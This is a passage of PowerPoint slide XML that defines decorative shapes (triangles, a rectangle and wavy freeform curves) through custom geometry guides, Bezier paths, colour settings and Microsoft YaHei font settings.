            <p:cNvPr id="15" name="等腰三角形 14"/>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6" name="等腰三角形 15"/>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7" name="等腰三角形 16"/>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sp>
          <p:nvSpPr>
            <p:cNvPr id="18" name="等腰三角形 17"/>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grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="矩形 1"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:custDataLst>
              <p:tags r:id="rId6"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="1353735"/>
            <a:ext cx="12192000" cy="421767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4" name="任意多边形: 形状 2"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:custDataLst>
              <p:tags r:id="rId7"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="-1" y="5322926"/>
            <a:ext cx="12192001" cy="496598"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="connsiteX0" fmla="*/ 0 w 12192000"/>
              <a:gd name="connsiteY0" fmla="*/ 0 h 914409"/>
              <a:gd name="connsiteX1" fmla="*/ 3062514 w 12192000"/>
              <a:gd name="connsiteY1" fmla="*/ 914400 h 914409"/>
              <a:gd name="connsiteX2" fmla="*/ 6096000 w 12192000"/>
              <a:gd name="connsiteY2" fmla="*/ 0 h 914409"/>
              <a:gd name="connsiteX3" fmla="*/ 9144000 w 12192000"/>
              <a:gd name="connsiteY3" fmla="*/ 914400 h 914409"/>
              <a:gd name="connsiteX4" fmla="*/ 12192000 w 12192000"/>
              <a:gd name="connsiteY4" fmla="*/ 14514 h 914409"/>
              <a:gd name="connsiteX0-1" fmla="*/ 0 w 12166242"/>
              <a:gd name="connsiteY0-2" fmla="*/ 491476 h 947169"/>
              <a:gd name="connsiteX1-3" fmla="*/ 3036756 w 12166242"/>
              <a:gd name="connsiteY1-4" fmla="*/ 914400 h 947169"/>
              <a:gd name="connsiteX2-5" fmla="*/ 6070242 w 12166242"/>
              <a:gd name="connsiteY2-6" fmla="*/ 0 h 947169"/>
              <a:gd name="connsiteX3-7" fmla="*/ 9118242 w 12166242"/>
              <a:gd name="connsiteY3-8" fmla="*/ 914400 h 947169"/>
              <a:gd name="connsiteX4-9" fmla="*/ 12166242 w 12166242"/>
              <a:gd name="connsiteY4-10" fmla="*/ 14514 h 947169"/>
              <a:gd name="connsiteX0-11" fmla="*/ 0 w 12166242"/>
              <a:gd name="connsiteY0-12" fmla="*/ 491476 h 1118533"/>
              <a:gd name="connsiteX1-13" fmla="*/ 3036756 w 12166242"/>
              <a:gd name="connsiteY1-14" fmla="*/ 914400 h 1118533"/>
              <a:gd name="connsiteX2-15" fmla="*/ 6070242 w 12166242"/>
              <a:gd name="connsiteY2-16" fmla="*/ 0 h 1118533"/>
              <a:gd name="connsiteX3-17" fmla="*/ 9118242 w 12166242"/>
              <a:gd name="connsiteY3-18" fmla="*/ 914400 h 1118533"/>
              <a:gd name="connsiteX4-19" fmla="*/ 12166242 w 12166242"/>
              <a:gd name="connsiteY4-20" fmla="*/ 14514 h 1118533"/>
              <a:gd name="connsiteX0-21" fmla="*/ 0 w 12166242"/>
              <a:gd name="connsiteY0-22" fmla="*/ 493388 h 1295533"/>
              <a:gd name="connsiteX1-23" fmla="*/ 2985241 w 12166242"/>
              <a:gd name="connsiteY1-24" fmla="*/ 1218759 h 1295533"/>
              <a:gd name="connsiteX2-25" fmla="*/ 6070242 w 12166242"/>
              <a:gd name="connsiteY2-26" fmla="*/ 1912 h 1295533"/>
              <a:gd name="connsiteX3-27" fmla="*/ 9118242 w 12166242"/>
              <a:gd name="connsiteY3-28" fmla="*/ 916312 h 1295533"/>
              <a:gd name="connsiteX4-29" fmla="*/ 12166242 w 12166242"/>
              <a:gd name="connsiteY4-30" fmla="*/ 16426 h 1295533"/>
              <a:gd name="connsiteX0-31" fmla="*/ 0 w 12166242"/>
              <a:gd name="connsiteY0-32" fmla="*/ 493389 h 1337371"/>
              <a:gd name="connsiteX1-33" fmla="*/ 2985241 w 12166242"/>
              <a:gd name="connsiteY1-34" fmla="*/ 1218760 h 1337371"/>
              <a:gd name="connsiteX2-35" fmla="*/ 6070242 w 12166242"/>
              <a:gd name="connsiteY2-36" fmla="*/ 1913 h 1337371"/>
              <a:gd name="connsiteX3-37" fmla="*/ 9118242 w 12166242"/>
              <a:gd name="connsiteY3-38" fmla="*/ 916313 h 1337371"/>
              <a:gd name="connsiteX4-39" fmla="*/ 12166242 w 12166242"/>
              <a:gd name="connsiteY4-40" fmla="*/ 16427 h 1337371"/>
              <a:gd name="connsiteX0-41" fmla="*/ 0 w 12140484"/>
              <a:gd name="connsiteY0-42" fmla="*/ 741602 h 1585583"/>
              <a:gd name="connsiteX1-43" fmla="*/ 2985241 w 12140484"/>
              <a:gd name="connsiteY1-44" fmla="*/ 1466973 h 1585583"/>
              <a:gd name="connsiteX2-45" fmla="*/ 6070242 w 12140484"/>
              <a:gd name="connsiteY2-46" fmla="*/ 250126 h 1585583"/>
              <a:gd name="connsiteX3-47" fmla="*/ 9118242 w 12140484"/>
              <a:gd name="connsiteY3-48" fmla="*/ 1164526 h 1585583"/>
              <a:gd name="connsiteX4-49" fmla="*/ 12140484 w 12140484"/>
              <a:gd name="connsiteY4-50" fmla="*/ 0 h 1585583"/>
              <a:gd name="connsiteX0-51" fmla="*/ 0 w 12140484"/>
              <a:gd name="connsiteY0-52" fmla="*/ 741602 h 1585583"/>
              <a:gd name="connsiteX1-53" fmla="*/ 2985241 w 12140484"/>
              <a:gd name="connsiteY1-54" fmla="*/ 1466973 h 1585583"/>
              <a:gd name="connsiteX2-55" fmla="*/ 6070242 w 12140484"/>
              <a:gd name="connsiteY2-56" fmla="*/ 250126 h 1585583"/>
              <a:gd name="connsiteX3-57" fmla="*/ 9118242 w 12140484"/>
              <a:gd name="connsiteY3-58" fmla="*/ 1164526 h 1585583"/>
              <a:gd name="connsiteX4-59" fmla="*/ 12140484 w 12140484"/>
              <a:gd name="connsiteY4-60" fmla="*/ 0 h 1585583"/>
              <a:gd name="connsiteX0-61" fmla="*/ 0 w 12140484"/>
              <a:gd name="connsiteY0-62" fmla="*/ 741602 h 1538291"/>
              <a:gd name="connsiteX1-63" fmla="*/ 2985241 w 12140484"/>
              <a:gd name="connsiteY1-64" fmla="*/ 1466973 h 1538291"/>
              <a:gd name="connsiteX2-65" fmla="*/ 3377997 w 12140484"/>
              <a:gd name="connsiteY2-66" fmla="*/ 1373570 h 1538291"/>
              <a:gd name="connsiteX3-67" fmla="*/ 6070242 w 12140484"/>
              <a:gd name="connsiteY3-68" fmla="*/ 250126 h 1538291"/>
              <a:gd name="connsiteX4-69" fmla="*/ 9118242 w 12140484"/>
              <a:gd name="connsiteY4-70" fmla="*/ 1164526 h 1538291"/>
              <a:gd name="connsiteX5" fmla="*/ 12140484 w 12140484"/>
              <a:gd name="connsiteY5" fmla="*/ 0 h 1538291"/>
              <a:gd name="connsiteX0-71" fmla="*/ 0 w 12140484"/>
              <a:gd name="connsiteY0-72" fmla="*/ 741602 h 1381432"/>
              <a:gd name="connsiteX1-73" fmla="*/ 3377997 w 12140484"/>
              <a:gd name="connsiteY1-74" fmla="*/ 1373570 h 1381432"/>
              <a:gd name="connsiteX2-75" fmla="*/ 6070242 w 12140484"/>
              <a:gd name="connsiteY2-76" fmla="*/ 250126 h 1381432"/>
              <a:gd name="connsiteX3-77" fmla="*/ 9118242 w 12140484"/>
              <a:gd name="connsiteY3-78" fmla="*/ 1164526 h 1381432"/>
              <a:gd name="connsiteX4-79" fmla="*/ 12140484 w 12140484"/>
              <a:gd name="connsiteY4-80" fmla="*/ 0 h 1381432"/>
              <a:gd name="connsiteX0-81" fmla="*/ 0 w 8762487"/>
              <a:gd name="connsiteY0-82" fmla="*/ 1373570 h 1373569"/>
              <a:gd name="connsiteX1-83" fmla="*/ 2692245 w 8762487"/>
              <a:gd name="connsiteY1-84" fmla="*/ 250126 h 1373569"/>
              <a:gd name="connsiteX2-85" fmla="*/ 5740245 w 8762487"/>
              <a:gd name="connsiteY2-86" fmla="*/ 1164526 h 1373569"/>
              <a:gd name="connsiteX3-87" fmla="*/ 8762487 w 8762487"/>
              <a:gd name="connsiteY3-88" fmla="*/ 0 h 1373569"/>
            </a:gdLst>
            <a:ahLst/>
            <a:cxnLst>
              <a:cxn ang="0">
                <a:pos x="connsiteX0-1" y="connsiteY0-2"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="connsiteX1-3" y="connsiteY1-4"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="connsiteX2-5" y="connsiteY2-6"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="connsiteX3-7" y="connsiteY3-8"/>
              </a:cxn>
            </a:cxnLst>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="8762487" h="1373569">
                <a:moveTo>
                  <a:pt x="0" y="1373570"/>
                </a:moveTo>
                <a:cubicBezTo>
                  <a:pt x="1011707" y="1291657"/>
                  <a:pt x="1735538" y="284967"/>
                  <a:pt x="2692245" y="250126"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="3648953" y="215285"/>
                  <a:pt x="4728538" y="1206214"/>
                  <a:pt x="5740245" y="1164526"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="6751952" y="1122838"/>
                  <a:pt x="7643456" y="696890"/>
                  <a:pt x="8762487" y="0"/>
                </a:cubicBezTo>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:noFill/>
          <a:ln w="0">
            <a:solidFill>
              <a:schemeClr val="dk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dk1">
                  <a:lumMod val="65000"/>
                  <a:lumOff val="35000"/>
                </a:schemeClr>
              </a:solidFill>
              <a:latin typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
              <a:ea typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="任意多边形: 形状 3"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:custDataLst>
              <p:tags r:id="rId8"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="10800000" flipH="1">
            <a:off x="-1" y="5397544"/>
            <a:ext cx="12192003" cy="359621"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="connsiteX0" fmla="*/ 0 w 12192000"/>
              <a:gd name="connsiteY0" fmla="*/ 0 h 914409"/>
              <a:gd name="connsiteX1" fmla="*/ 3062514 w 12192000"/>
              <a:gd name="connsiteY1" fmla="*/ 914400 h 914409"/>
              <a:gd name="connsiteX2" fmla="*/ 6096000 w 12192000"/>
              <a:gd name="connsiteY2" fmla="*/ 0 h 914409"/>
              <a:gd name="connsiteX3" fmla="*/ 9144000 w 12192000"/>
              <a:gd name="connsiteY3" fmla="*/ 914400 h 914409"/>
              <a:gd name="connsiteX4" fmla="*/ 12192000 w 12192000"/>
              <a:gd name="connsiteY4" fmla="*/ 14514 h 914409"/>
              <a:gd name="connsiteX0-1" fmla="*/ 0 w 12166242"/>
              <a:gd name="connsiteY0-2" fmla="*/ 491476 h 947169"/>
              <a:gd name="connsiteX1-3" fmla="*/ 3036756 w 12166242"/>
              <a:gd name="connsiteY1-4" fmla="*/ 914400 h 947169"/>
              <a:gd name="connsiteX2-5" fmla="*/ 6070242 w 12166242"/>
              <a:gd name="connsiteY2-6" fmla="*/ 0 h 947169"/>
              <a:gd name="connsiteX3-7" fmla="*/ 9118242 w 12166242"/>
              <a:gd name="connsiteY3-8" fmla="*/ 914400 h 947169"/>
              <a:gd name="connsiteX4-9" fmla="*/ 12166242 w 12166242"/>
              <a:gd name="connsiteY4-10" fmla="*/ 14514 h 947169"/>
              <a:gd name="connsiteX0-11" fmla="*/ 0 w 12166242"/>
              <a:gd name="connsiteY0-12" fmla="*/ 491476 h 1118533"/>
              <a:gd name="connsiteX1-13" fmla="*/ 3036756 w 12166242"/>
              <a:gd name="connsiteY1-14" fmla="*/ 914400 h 1118533"/>
              <a:gd name="connsiteX2-15" fmla="*/ 6070242 w 12166242"/>
              <a:gd name="connsiteY2-16" fmla="*/ 0 h 1118533"/>
              <a:gd name="connsiteX3-17" fmla="*/ 9118242 w 12166242"/>
              <a:gd name="connsiteY3-18" fmla="*/ 914400 h 1118533"/>
              <a:gd name="connsiteX4-19" fmla="*/ 12166242 w 12166242"/>
              <a:gd name="connsiteY4-20" fmla="*/ 14514 h 1118533"/>
              <a:gd name="connsiteX0-21" fmla="*/ 0 w 12166242"/>
              <a:gd name="connsiteY0-22" fmla="*/ 493388 h 1295533"/>
              <a:gd name="connsiteX1-23" fmla="*/ 2985241 w 12166242"/>
              <a:gd name="connsiteY1-24" fmla="*/ 1218759 h 1295533"/>
              <a:gd name="connsiteX2-25" fmla="*/ 6070242 w 12166242"/>
              <a:gd name="connsiteY2-26" fmla="*/ 1912 h 1295533"/>
              <a:gd name="connsiteX3-27" fmla="*/ 9118242 w 12166242"/>
              <a:gd name="connsiteY3-28" fmla="*/ 916312 h 1295533"/>
              <a:gd name="connsiteX4-29" fmla="*/ 12166242 w 12166242"/>
              <a:gd name="connsiteY4-30" fmla="*/ 16426 h 1295533"/>
              <a:gd name="connsiteX0-31" fmla="*/ 0 w 12166242"/>
              <a:gd name="connsiteY0-32" fmla="*/ 493389 h 1337371"/>
              <a:gd name="connsiteX1-33" fmla="*/ 2985241 w 12166242"/>
              <a:gd name="connsiteY1-34" fmla="*/ 1218760 h 1337371"/>
              <a:gd name="connsiteX2-35" fmla="*/ 6070242 w 12166242"/>
              <a:gd name="connsiteY2-36" fmla="*/ 1913 h 1337371"/>
              <a:gd name="connsiteX3-37" fmla="*/ 9118242 w 12166242"/>
              <a:gd name="connsiteY3-38" fmla="*/ 916313 h 1337371"/>
              <a:gd name="connsiteX4-39" fmla="*/ 12166242 w 12166242"/>
              <a:gd name="connsiteY4-40" fmla="*/ 16427 h 1337371"/>
              <a:gd name="connsiteX0-41" fmla="*/ 0 w 12140484"/>
              <a:gd name="connsiteY0-42" fmla="*/ 741602 h 1585583"/>
              <a:gd name="connsiteX1-43" fmla="*/ 2985241 w 12140484"/>
              <a:gd name="connsiteY1-44" fmla="*/ 1466973 h 1585583"/>
              <a:gd name="connsiteX2-45" fmla="*/ 6070242 w 12140484"/>
              <a:gd name="connsiteY2-46" fmla="*/ 250126 h 1585583"/>
              <a:gd name="connsiteX3-47" fmla="*/ 9118242 w 12140484"/>
              <a:gd name="connsiteY3-48" fmla="*/ 1164526 h 1585583"/>
              <a:gd name="connsiteX4-49" fmla="*/ 12140484 w 12140484"/>
              <a:gd name="connsiteY4-50" fmla="*/ 0 h 1585583"/>
              <a:gd name="connsiteX0-51" fmla="*/ 0 w 12140484"/>
              <a:gd name="connsiteY0-52" fmla="*/ 741602 h 1585583"/>
              <a:gd name="connsiteX1-53" fmla="*/ 2985241 w 12140484"/>
              <a:gd name="connsiteY1-54" fmla="*/ 1466973 h 1585583"/>
              <a:gd name="connsiteX2-55" fmla="*/ 6070242 w 12140484"/>
              <a:gd name="connsiteY2-56" fmla="*/ 250126 h 1585583"/>
              <a:gd name="connsiteX3-57" fmla="*/ 9118242 w 12140484"/>
              <a:gd name="connsiteY3-58" fmla="*/ 1164526 h 1585583"/>
              <a:gd name="connsiteX4-59" fmla="*/ 12140484 w 12140484"/>
              <a:gd name="connsiteY4-60" fmla="*/ 0 h 1585583"/>
              <a:gd name="connsiteX0-61" fmla="*/ 0 w 12140484"/>
              <a:gd name="connsiteY0-62" fmla="*/ 741602 h 1538291"/>
              <a:gd name="connsiteX1-63" fmla="*/ 2985241 w 12140484"/>
              <a:gd name="connsiteY1-64" fmla="*/ 1466973 h 1538291"/>
              <a:gd name="connsiteX2-65" fmla="*/ 3377997 w 12140484"/>
              <a:gd name="connsiteY2-66" fmla="*/ 1373570 h 1538291"/>
              <a:gd name="connsiteX3-67" fmla="*/ 6070242 w 12140484"/>
              <a:gd name="connsiteY3-68" fmla="*/ 250126 h 1538291"/>
              <a:gd name="connsiteX4-69" fmla="*/ 9118242 w 12140484"/>
              <a:gd name="connsiteY4-70" fmla="*/ 1164526 h 1538291"/>
              <a:gd name="connsiteX5" fmla="*/ 12140484 w 12140484"/>
              <a:gd name="connsiteY5" fmla="*/ 0 h 1538291"/>
              <a:gd name="connsiteX0-71" fmla="*/ 0 w 12140484"/>
              <a:gd name="connsiteY0-72" fmla="*/ 741602 h 1381432"/>
              <a:gd name="connsiteX1-73" fmla="*/ 3377997 w 12140484"/>
              <a:gd name="connsiteY1-74" fmla="*/ 1373570 h 1381432"/>
              <a:gd name="connsiteX2-75" fmla="*/ 6070242 w 12140484"/>
              <a:gd name="connsiteY2-76" fmla="*/ 250126 h 1381432"/>
              <a:gd name="connsiteX3-77" fmla="*/ 9118242 w 12140484"/>
              <a:gd name="connsiteY3-78" fmla="*/ 1164526 h 1381432"/>
              <a:gd name="connsiteX4-79" fmla="*/ 12140484 w 12140484"/>
              <a:gd name="connsiteY4-80" fmla="*/ 0 h 1381432"/>
              <a:gd name="connsiteX0-81" fmla="*/ 0 w 8762487"/>
              <a:gd name="connsiteY0-82" fmla="*/ 1373570 h 1373569"/>
              <a:gd name="connsiteX1-83" fmla="*/ 2692245 w 8762487"/>
              <a:gd name="connsiteY1-84" fmla="*/ 250126 h 1373569"/>
              <a:gd name="connsiteX2-85" fmla="*/ 5740245 w 8762487"/>
              <a:gd name="connsiteY2-86" fmla="*/ 1164526 h 1373569"/>
              <a:gd name="connsiteX3-87" fmla="*/ 8762487 w 8762487"/>
              <a:gd name="connsiteY3-88" fmla="*/ 0 h 1373569"/>
              <a:gd name="connsiteX0-89" fmla="*/ 0 w 8762487"/>
              <a:gd name="connsiteY0-90" fmla="*/ 1373570 h 1373569"/>
              <a:gd name="connsiteX1-91" fmla="*/ 770641 w 8762487"/>
              <a:gd name="connsiteY1-92" fmla="*/ 1108053 h 1373569"/>
              <a:gd name="connsiteX2-93" fmla="*/ 2692245 w 8762487"/>
              <a:gd name="connsiteY2-94" fmla="*/ 250126 h 1373569"/>
              <a:gd name="connsiteX3-95" fmla="*/ 5740245 w 8762487"/>
              <a:gd name="connsiteY3-96" fmla="*/ 1164526 h 1373569"/>
              <a:gd name="connsiteX4-97" fmla="*/ 8762487 w 8762487"/>
              <a:gd name="connsiteY4-98" fmla="*/ 0 h 1373569"/>
              <a:gd name="connsiteX0-99" fmla="*/ 0 w 7991846"/>
              <a:gd name="connsiteY0-100" fmla="*/ 1108053 h 1165862"/>
              <a:gd name="connsiteX1-101" fmla="*/ 1921604 w 7991846"/>
              <a:gd name="connsiteY1-102" fmla="*/ 250126 h 1165862"/>
              <a:gd name="connsiteX2-103" fmla="*/ 4969604 w 7991846"/>
              <a:gd name="connsiteY2-104" fmla="*/ 1164526 h 1165862"/>
              <a:gd name="connsiteX3-105" fmla="*/ 7991846 w 7991846"/>
              <a:gd name="connsiteY3-106" fmla="*/ 0 h 1165862"/>
            </a:gdLst>
            <a:ahLst/>
            <a:cxnLst>
              <a:cxn ang="0">
                <a:pos x="connsiteX0-1" y="connsiteY0-2"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="connsiteX1-3" y="connsiteY1-4"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="connsiteX2-5" y="connsiteY2-6"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="connsiteX3-7" y="connsiteY3-8"/>
              </a:cxn>
            </a:cxnLst>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="7991846" h="1165862">
                <a:moveTo>
                  <a:pt x="0" y="1108053"/>
                </a:moveTo>
                <a:cubicBezTo>
                  <a:pt x="448708" y="920812"/>
                  <a:pt x="1093337" y="240714"/>
                  <a:pt x="1921604" y="250126"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="2749871" y="259538"/>
                  <a:pt x="3957897" y="1206214"/>
                  <a:pt x="4969604" y="1164526"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="5981311" y="1122838"/>
                  <a:pt x="6872815" y="696890"/>
                  <a:pt x="7991846" y="0"/>
                </a:cubicBezTo>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:noFill/>
          <a:ln w="0">
            <a:solidFill>
              <a:schemeClr val="dk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dk1">
                  <a:lumMod val="65000"/>
                  <a:lumOff val="35000"/>
                </a:schemeClr>
              </a:solidFill>
              <a:latin typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
              <a:ea typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="任意多边形: 形状 4"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:custDataLst>
              <p:tags r:id="rId9"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="0" y="894029"/>
            <a:ext cx="12192001" cy="539325"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="connsiteX0" fmla="*/ 0 w 12192000"/>
              <a:gd name="connsiteY0" fmla="*/ 0 h 914409"/>
              <a:gd name="connsiteX1" fmla="*/ 3062514 w 12192000"/>
              <a:gd name="connsiteY1" fmla="*/ 914400 h 914409"/>
              <a:gd name="connsiteX2" fmla="*/ 6096000 w 12192000"/>
              <a:gd name="connsiteY2" fmla="*/ 0 h 914409"/>
              <a:gd name="connsiteX3" fmla="*/ 9144000 w 12192000"/>
              <a:gd name="connsiteY3" fmla="*/ 914400 h 914409"/>
              <a:gd name="connsiteX4" fmla="*/ 12192000 w 12192000"/>
              <a:gd name="connsiteY4" fmla="*/ 14514 h 914409"/>
              <a:gd name="connsiteX0-1" fmla="*/ 0 w 12166242"/>
              <a:gd name="connsiteY0-2" fmla="*/ 491476 h 947169"/>
              <a:gd name="connsiteX1-3" fmla="*/ 3036756 w 12166242"/>
              <a:gd name="connsiteY1-4" fmla="*/ 914400 h 947169"/>
              <a:gd name="connsiteX2-5" fmla="*/ 6070242 w 12166242"/>
              <a:gd name="connsiteY2-6" fmla="*/ 0 h 947169"/>
              <a:gd name="connsiteX3-7" fmla="*/ 9118242 w 12166242"/>
              <a:gd name="connsiteY3-8" fmla="*/ 914400 h 947169"/>
              <a:gd name="connsiteX4-9" fmla="*/ 12166242 w 12166242"/>
              <a:gd name="connsiteY4-10" fmla="*/ 14514 h 947169"/>
              <a:gd name="connsiteX0-11" fmla="*/ 0 w 12166242"/>
              <a:gd name="connsiteY0-12" fmla="*/ 491476 h 1118533"/>
              <a:gd name="connsiteX1-13" fmla="*/ 3036756 w 12166242"/>
              <a:gd name="connsiteY1-14" fmla="*/ 914400 h 1118533"/>
              <a:gd name="connsiteX2-15" fmla="*/ 6070242 w 12166242"/>
              <a:gd name="connsiteY2-16" fmla="*/ 0 h 1118533"/>
              <a:gd name="connsiteX3-17" fmla="*/ 9118242 w 12166242"/>
              <a:gd name="connsiteY3-18" fmla="*/ 914400 h 1118533"/>
              <a:gd name="connsiteX4-19" fmla="*/ 12166242 w 12166242"/>
              <a:gd name="connsiteY4-20" fmla="*/ 14514 h 1118533"/>
              <a:gd name="connsiteX0-21" fmla="*/ 0 w 12166242"/>
              <a:gd name="connsiteY0-22" fmla="*/ 493388 h 1295533"/>
              <a:gd name="connsiteX1-23" fmla="*/ 2985241 w 12166242"/>
              <a:gd name="connsiteY1-24" fmla="*/ 1218759 h 1295533"/>
              <a:gd name="connsiteX2-25" fmla="*/ 6070242 w 12166242"/>
              <a:gd name="connsiteY2-26" fmla="*/ 1912 h 1295533"/>
              <a:gd name="connsiteX3-27" fmla="*/ 9118242 w 12166242"/>
              <a:gd name="connsiteY3-28" fmla="*/ 916312 h 1295533"/>
              <a:gd name="connsiteX4-29" fmla="*/ 12166242 w 12166242"/>
              <a:gd name="connsiteY4-30" fmla="*/ 16426 h 1295533"/>
              <a:gd name="connsiteX0-31" fmla="*/ 0 w 12166242"/>
              <a:gd name="connsiteY0-32" fmla="*/ 493389 h 1337371"/>
              <a:gd name="connsiteX1-33" fmla="*/ 2985241 w 12166242"/>
              <a:gd name="connsiteY1-34" fmla="*/ 1218760 h 1337371"/>
              <a:gd name="connsiteX2-35" fmla="*/ 6070242 w 12166242"/>
              <a:gd name="connsiteY2-36" fmla="*/ 1913 h 1337371"/>
              <a:gd name="connsiteX3-37" fmla="*/ 9118242 w 12166242"/>
              <a:gd name="connsiteY3-38" fmla="*/ 916313 h 1337371"/>
              <a:gd name="connsiteX4-39" fmla="*/ 12166242 w 12166242"/>
              <a:gd name="connsiteY4-40" fmla="*/ 16427 h 1337371"/>
              <a:gd name="connsiteX0-41" fmla="*/ 0 w 12140484"/>
              <a:gd name="connsiteY0-42" fmla="*/ 741602 h 1585583"/>
              <a:gd name="connsiteX1-43" fmla="*/ 2985241 w 12140484"/>
              <a:gd name="connsiteY1-44" fmla="*/ 1466973 h 1585583"/>
              <a:gd name="connsiteX2-45" fmla="*/ 6070242 w 12140484"/>
              <a:gd name="connsiteY2-46" fmla="*/ 250126 h 1585583"/>
              <a:gd name="connsiteX3-47" fmla="*/ 9118242 w 12140484"/>
              <a:gd name="connsiteY3-48" fmla="*/ 1164526 h 1585583"/>
              <a:gd name="connsiteX4-49" fmla="*/ 12140484 w 12140484"/>
              <a:gd name="connsiteY4-50" fmla="*/ 0 h 1585583"/>
              <a:gd name="connsiteX0-51" fmla="*/ 0 w 12140484"/>
              <a:gd name="connsiteY0-52" fmla="*/ 741602 h 1585583"/>
              <a:gd name="connsiteX1-53" fmla="*/ 2985241 w 12140484"/>
              <a:gd name="connsiteY1-54" fmla="*/ 1466973 h 1585583"/>
              <a:gd name="connsiteX2-55" fmla="*/ 6070242 w 12140484"/>
              <a:gd name="connsiteY2-56" fmla="*/ 250126 h 1585583"/>
              <a:gd name="connsiteX3-57" fmla="*/ 9118242 w 12140484"/>
              <a:gd name="connsiteY3-58" fmla="*/ 1164526 h 1585583"/>
              <a:gd name="connsiteX4-59" fmla="*/ 12140484 w 12140484"/>
              <a:gd name="connsiteY4-60" fmla="*/ 0 h 1585583"/>
              <a:gd name="connsiteX0-61" fmla="*/ 0 w 12140484"/>
              <a:gd name="connsiteY0-62" fmla="*/ 741602 h 1538291"/>
              <a:gd name="connsiteX1-63" fmla="*/ 2985241 w 12140484"/>
              <a:gd name="connsiteY1-64" fmla="*/ 1466973 h 1538291"/>
              <a:gd name="connsiteX2-65" fmla="*/ 3377997 w 12140484"/>
              <a:gd name="connsiteY2-66" fmla="*/ 1373570 h 1538291"/>
              <a:gd name="connsiteX3-67" fmla="*/ 6070242 w 12140484"/>
              <a:gd name="connsiteY3-68" fmla="*/ 250126 h 1538291"/>
              <a:gd name="connsiteX4-69" fmla="*/ 9118242 w 12140484"/>
              <a:gd name="connsiteY4-70" fmla="*/ 1164526 h 1538291"/>
              <a:gd name="connsiteX5" fmla="*/ 12140484 w 12140484"/>
              <a:gd name="connsiteY5" fmla="*/ 0 h 1538291"/>
              <a:gd name="connsiteX0-71" fmla="*/ 0 w 12140484"/>
              <a:gd name="connsiteY0-72" fmla="*/ 741602 h 1381432"/>
              <a:gd name="connsiteX1-73" fmla="*/ 3377997 w 12140484"/>
              <a:gd name="connsiteY1-74" fmla="*/ 1373570 h 1381432"/>
              <a:gd name="connsiteX2-75" fmla="*/ 6070242 w 12140484"/>
              <a:gd name="connsiteY2-76" fmla="*/ 250126 h 1381432"/>
              <a:gd name="connsiteX3-77" fmla="*/ 9118242 w 12140484"/>
              <a:gd name="connsiteY3-78" fmla="*/ 1164526 h 1381432"/>
              <a:gd name="connsiteX4-79" fmla="*/ 12140484 w 12140484"/>
              <a:gd name="connsiteY4-80" fmla="*/ 0 h 1381432"/>
              <a:gd name="connsiteX0-81" fmla="*/ 0 w 8762487"/>
              <a:gd name="connsiteY0-82" fmla="*/ 1373570 h 1373569"/>
              <a:gd name="connsiteX1-83" fmla="*/ 2692245 w 8762487"/>
              <a:gd name="connsiteY1-84" fmla="*/ 250126 h 1373569"/>
              <a:gd name="connsiteX2-85" fmla="*/ 5740245 w 8762487"/>
              <a:gd name="connsiteY2-86" fmla="*/ 1164526 h 1373569"/>
              <a:gd name="connsiteX3-87" fmla="*/ 8762487 w 8762487"/>
              <a:gd name="connsiteY3-88" fmla="*/ 0 h 1373569"/>
            </a:gdLst>
            <a:ahLst/>
            <a:cxnLst>
              <a:cxn ang="0">
                <a:pos x="connsiteX0-1" y="connsiteY0-2"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="connsiteX1-3" y="connsiteY1-4"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="connsiteX2-5" y="connsiteY2-6"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="connsiteX3-7" y="connsiteY3-8"/>
              </a:cxn>
            </a:cxnLst>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="8762487" h="1373569">
                <a:moveTo>
                  <a:pt x="0" y="1373570"/>
                </a:moveTo>
                <a:cubicBezTo>
                  <a:pt x="1011707" y="1291657"/>
                  <a:pt x="1735538" y="284967"/>
                  <a:pt x="2692245" y="250126"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="3648953" y="215285"/>
                  <a:pt x="4728538" y="1206214"/>
                  <a:pt x="5740245" y="1164526"/>
